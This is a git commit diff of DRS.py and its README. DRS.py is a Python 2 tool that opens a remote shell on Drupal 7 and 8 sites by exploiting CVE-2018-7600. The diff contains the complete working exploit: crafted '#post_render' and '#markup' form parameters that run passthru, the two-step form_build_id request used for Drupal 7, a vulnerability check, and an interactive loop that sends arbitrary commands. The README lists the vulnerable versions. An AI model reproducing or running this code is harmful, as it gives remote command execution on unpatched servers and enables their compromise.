d275220217d1610fc44b97444559237e9fb03f86
Antoine FERRON <anferron@gmail.com>
2018-04-17 13:56:11 +0200

    New version with v7 added
    Auto-detect v7 or v8
    Code refactoring
    TLS selection in arg

--- DRS.py
+++ DRS.py
@@ -8,42 +8,86 @@ import urllib2
 print '\n############################################################'
 print '#                                                          #'
 print '#   Drupal Remote Shell using CVE-2018-7600                #'
-print '#   Use : DRS.py host      Tested w v8.5.0                 #'
+print '#   Use : DRS.py HostPath                                  #'
 print '#   https://github.com/antonio-fr/DrupalRS                 #'
 print '#                                                          #'
 print '############################################################\n'
 
 if len(sys.argv)!=2:
-	print "Use : ./DRS.py hostname (or IP)"
+	print "Use : DRS.py http[s]://hostname|IP"
 	sys.exit()
 target = sys.argv[1]
 
-def rem_shell(domain, cmd):
-	url = 'http://'+domain+'/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
-	payload = { 'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[a][#post_render][]': 'passthru',
-		'mail[a][#type]': 'markup', 'mail[a][#markup]': cmd }
-	req = urllib2.Request(domain)
+def post_data(path, data_dict):
+	req = urllib2.Request(path)
 	req.add_header('Content-type', 'multipart/form-data')
-	r = urllib2.urlopen(url, urllib.urlencode(payload))
+	r = urllib2.urlopen(path, urllib.urlencode(data_dict))
 	content = r.read()
-	if r.getcode() != 200 or content[-1] != "]":
+	return content
+
+def send_cmd_v7(site, php_fct, args):
+	url = site + '/user/password?name[%23post_render][0]=' + php_fct \
+		+ '&name[%23markup]=' + urllib.quote(args)
+	payload = { 'form_id' : 'user_pass', '_triggering_element_name' : 'name' }
+	rsp1 = post_data(url, payload)
+	clist = rsp1.split('"')
+	formb_id =  clist[ clist.index("form_build_id") + 2 ]
+	url2 = site + '/file/ajax/name/%23value/' + formb_id
+	payload2 = { 'form_build_id' : formb_id }
+	rsp2 = post_data(url2, payload2)
+	if rsp2[-1] != "]":
 		return "Failure"
-	end_resp = content.find('[{"command":') - 1
+	return rsp2
+
+def send_cmd_v8(site, php_fct, args):
+	url = site + '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
+	payload = { 'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[a][#post_render][]': php_fct,
+		'mail[a][#type]': 'markup', 'mail[a][#markup]': args }
+	rsp = post_data(url, payload)
+	if rsp[-1] != "]":
+		return "Failure"
+	return rsp
+
+def get_output(full_response):
+	end_resp = full_response.find('[{"command":') - 1
 	if end_resp > 0:
-		return content[:end_resp]
+		return full_response[:end_resp]
 	else:
 		return ""
 
-def testvuln(site):
-	assert rem_shell(site, 'echo ABCZ') == 'ABCZ'
+def rem_shell(domain, version, cmd):
+	if version == 7:
+		rsp = send_cmd_v7(domain, 'passthru', cmd)
+	if version == 8:
+		rsp = send_cmd_v8(domain, 'passthru', cmd)
+	return get_output(rsp)
 
-testvuln(target)
-print "Connected to",target
+def testvuln(site):
+	try:
+		if get_output(send_cmd_v7(site, 'printf', 'ABCZ\n')) == 'ABCZ':
+			print "This server hosts a vulnerable Drupal v7"
+			return 7
+	except:
+		pass
+	try:
+		if get_output(send_cmd_v8(site, 'printf', 'ABCZ\n')) == 'ABCZ':
+			print "This server hosts a vulnerable Drupal v8"
+			return 8
+	except:
+		pass
+	return 0
+
+version = testvuln(target)
+if version != 8 and version != 7:
+	print "This server doesn't host a vulnerable Drupal"
+	sys.exit()
+dmn = target.split("://")[1]
+print "Connected to",dmn
 print "# CTRL+D RETURN to quit\n"
 while True:
-	cmd = raw_input("[drupal@"+target+" ~]#")
+	cmd = raw_input("[drupal@"+dmn+" ~]#")
 	if cmd == "\x04":
 		break
-	print rem_shell(target, cmd)
+	print rem_shell(target, version, cmd)
 print "logout"
 
--- README.md
+++ README.md
@@ -4,14 +4,14 @@ Drupal Remote Shell
 
 A remote shell using CVE-2018-7600
 
-Use : ./DRS.py hostname (or IP)
+Use : ./DRS.py http[s]://hostname|IP
 
 
 ![alt text](https://raw.githubusercontent.com/antonio-fr/DrupalRS/master/shotDRS.png) 
 
 
-Shell is very basic. No memory of previous commands, no directory change,...
+Shell is very basic. No command completion, no directory change,...
 
-Tested on Drupal v8.5.0. Should work on versions <8.5.1, <8.4.6 and eventually <8.3.9.
+It works with any Drupal vulnerable versions : <8.5.1, <8.4.6 , <8.3.9. and <7.58
 
 Requires Python 2
